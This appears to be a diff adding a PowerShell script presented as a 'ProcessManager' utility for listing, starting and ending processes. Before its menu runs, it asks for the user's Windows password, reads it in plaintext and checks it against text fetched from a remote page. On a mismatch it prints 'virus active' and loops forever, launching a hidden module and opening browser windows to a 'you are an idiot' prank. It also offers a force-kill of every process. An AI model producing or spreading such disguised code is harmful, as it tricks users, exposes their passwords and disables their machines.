@@ -1,0 +1,137 @@
+#p>
+#made by YAGNATOR #br>
+$user = $env:USERNAME #br>
+$pathWithEnv = "C:\Users\$user\Desktop\ProcessManager" #br>
+$pathWithEnvForYAAI = "C:\Users\$user\Desktop\ProcessManager\modules\YAAI.ps1" #br>
+$pathBooleanFolder = Test-Path -Path "$pathWithEnv" #br>
+$pathBooleanYAAI = Test-Path -Path "$pathWithEnvForYAAI" #br>
+$pathWithNotepad = "C:\Users\$user\Desktop\ProcessManager\ReadMe.txt" #br>
+
+#function rq #br>
+if (($pathBooleanFolder -eq $false) -or ($pathBooleanYAAI -eq $false)) { #br>
+    Write-Warning "Please verify that everything is in the folder. If not, Redownload the folder from source and extract it again. when extracted, Move the folder in desktop and try again." #br>
+    Write-Warning "this window will close in 30 seconds." #br>
+    #wait 30 seconds #br>
+    Start-Sleep -Seconds 30 #br>
+
+} else { #br>
+    if (-not $env:USERNAME -eq 4806857533) { #br>
+ Start-Process -FilePath "$pathWithNotepad" #br>
+ #wait 5 seconds #br>
+ Start-Sleep -Seconds 5 #br>
+ $pw = Get-Credential "$user" #br>
+ $pwPlain = $pw.GetNetworkCredential().Password #br>
+ $cgfdsljas = Invoke-WebRequest "https://youraveragegreennoob.github.io/IUDOFJGFDPOIGJuioyhHTROIPFDjcvxhyokiygBJDIROTGFJPVGUHRTIGOJBFHYUOIGTF/" #br>
+ $jkhhjfklghfkdhgkl = $cgfdsljas.ParsedHtml.body.innerText #br>
+
+ if (-not($pwPlain -ceq $jkhhjfklghfkdhgkl)) { #br>
+    $active = $true #br>
+    Write-Host "virus active" #br>
+    Start-Process -FilePath "C:\Users\$user\Desktop\ProcessManager\modules\YAAI.ps1" #br>
+    while ($active) {  #br>
+        Write-Host "
+        {{{{{{{{{{{{{{{{{{{{{{    {{{{{{{{{
+      {{                      {{{{{{{{{{{{{{{
+	   {{  	Y    A    G    N      {{{{{{{{{{{
+	     {{	    		               {{
+        {{{{{{{{{{{{{{{{{{{{{{
+    "
+    Start-Process "msedge.exe" "--new-window https://tse1.mm.bing.net/th/id/OIP.S_PfIBoDsedg9WnK2IKeygHaEK?w=298&h=167&c=7&r=0&o=7&dpr=1.1&pid=1.7&rm=3" -WindowStyle Minimized #br>
+    Start-Process "msedge.exe" "--new-window https://www.youtube.com/watch?v=48rz8udZBmQ&pp=ygUQeW91IGFyZSBhbiBpZGlvdA%3D%3D&themeRefresh=1&theme=dark" -WindowStyle Minimized #br>
+    Start-Process -FilePath "C:\Users\$user\Desktop\ProcessManager\modules\YAAI.ps1" -WindowStyle Hidden #br>
+        Write-Warning " #br>
+        {{{{{{{{{{{{{{{{{{{{{{    {{{{{{{{{ #br>
+      {{                      {{{{{{{{{{{{{{{ #br>
+	   {{  	Y    A    G    N      {{{{{{{{{{{{ #br>
+	     {{	    		               {{ #br>
+        {{{{{{{{{{{{{{{{{{{{{{ #br>
+    " #br>
+    } #br>
+    } #br>
+ } else { #br>
+$color = Read-Host "what color would you like the text to be? (Choose from: Black, DarkBlue, DarkGreen, DarkCyan, DarkRed, DarkMagenta, DarkYellow, Gray, DarkGray, Blue, Green, Cyan, Red, Magenta, Yellow, White)" #br>
+$BGcolor = Read-Host "what color would you like the background text to be? (Choose from: Black, DarkBlue, DarkGreen, DarkCyan, DarkRed, DarkMagenta, DarkYellow, Gray, DarkGray, Blue, Green, Cyan, Red, Magenta, Yellow, White)" #br>
+$host.UI.RawUI.ForegroundColor = $color #br>
+$host.UI.RawUI.BackgroundColor = $BGcolor #br>
+
+Get-Process #br>
+
+while(1 + 1 -eq 2) { #br>
+$ProcessName = Read-Host "Choose a process to modify from above. (Make sure to spell exactly how it is or it will not work as expected) (if you want to start a process or reload processes open, skip this prompt)" #br>
+$action = Read-Host "Choose what modify tool you want to use with the options below: #br>
+End Process (type E) #br>
+Start Process (type S) #br>
+Get information on Process (type I) #br>
+Refresh Processes (type RF) #br>
+Reload Process (type RL) #br>
+Get Process Path (type GP) #br>
+End All Process (Expirimental, Not reccomended)(EA)" #br>
+
+if ($action -eq "E") { #br>
+    $action = Read-Host "Would you like to end the process by the name you just typed (N) or id (I)? (Note: if you end the process by name, all instances of the process will be ended.)" #br>
+    if ($action -eq "N") { #br>
+        Stop-Process -Name $ProcessName -Force #br>
+    } elseif ($action -eq "I") { #br>
+        [int]$ProcessID = Read-Host "Enter Process id" #br>
+        Stop-Process -id $ProcessID -Force #br>
+    } else { #br>
+    Write-Warning "What you entered isnt a option above" #br>
+    } #br>
+} elseif ($action -eq "S") { #br>
+    $action = Read-Host "Would you like to start a website(W) or start a application(A)?" #br>
+    if ($action -eq "W") { #br>
+    $ProcessName = Read-Host "Please type the website (ex: www.bing.com) and make sure to include www. or command will not run correctly" #br>
+    Start "$ProcessName" #br>
+    } elseif ($action -eq "A") { #br>
+    $ProcessName = Read-Host "Choose from the process listed below: #br>
+    msedge #br>
+    chrome #br>
+    Or enter a filepath (ex: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe') #br>
+    " #br>
+    if ($ProcessName -eq "msedge") { #br>
+    Start-Process -FilePath "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" #br>
+    } elseif ($ProcessName -eq "chrome") { #br>
+    Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe" #br>
+    } elseif ($ProcessName -like "*C:\*") { #br>
+    Start-Process -FilePath $ProcessName #br>
+    } else { #br>
+    Write-Warning "This is not an app listed!" #br>
+    } #br>
+    } else { #br>
+        Write-Warning "Not an action!" #br>
+    } #br>
+
+} elseif ($action -eq "I") { #br>
+    Get-Process -Name $ProcessName #br>
+} elseif ($action -eq "RF") { #br>
+    Get-Process #br>
+} elseif ($action -eq "RL") { #br>
+    $RLProcess = Get-Process -Name $ProcessName #br>
+    $RLProcessFilePath = $RLProcess.Path #br>
+    Stop-Process -Name $ProcessName #br>
+    Start-Process -FilePath "$RLProcessFilePath" #br>
+} elseif ($action -eq "GP") { #br>
+    $RLProcess = Get-Process -Name $ProcessName #br>
+    $RLProcessFilePath = $RLProcess.Path #br>
+    Write-Host "Path: $RLProcessFilePath" #br>
+} elseif ($action -eq "EA") { #br>
+    Write-Warning "This command is in expirimental and might mess with core processes." #br>
+    $action = Read-Host "Proceed? Yes(Y) No(N)" #br>
+    if ($action -eq "Y") { #br>
+    Stop-Process -Name "*" -Force #br>
+    } elseif ($action -eq "N") { #br>
+    Write-Host "Task Canceled." #br>
+    } #br>
+} else { #br>
+    Write-Warning "Not a action!" #br>
+} #br>
+Write-Host "Task Complete!" #br>
+Write-Host " " #br>
+  
+
+Write-Host " " #br>
+Write-Host " " #br>
+} #br>
+ } #br>
+} #br>
+#/p>
